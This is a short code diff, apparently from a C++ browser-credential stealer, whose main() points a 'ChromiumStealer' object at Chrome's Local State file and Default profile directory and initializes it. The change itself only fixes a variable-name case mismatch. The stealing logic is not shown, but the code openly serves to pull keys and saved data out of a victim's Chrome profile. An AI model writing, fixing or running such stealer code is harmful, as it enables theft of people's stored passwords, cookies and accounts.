@@ -28,7 +28,7 @@ int main() {
     std::string Database_Path = "Google\\Chrome\\User Data\\Default";
 
     // Define the stealer
-    ChromiumStealer Stealer(Local_State_Path, Database_Path);
+    ChromiumStealer stealer(Local_State_Path, Database_Path);
 
     // Initialize the stealer
     stealer.initialize();
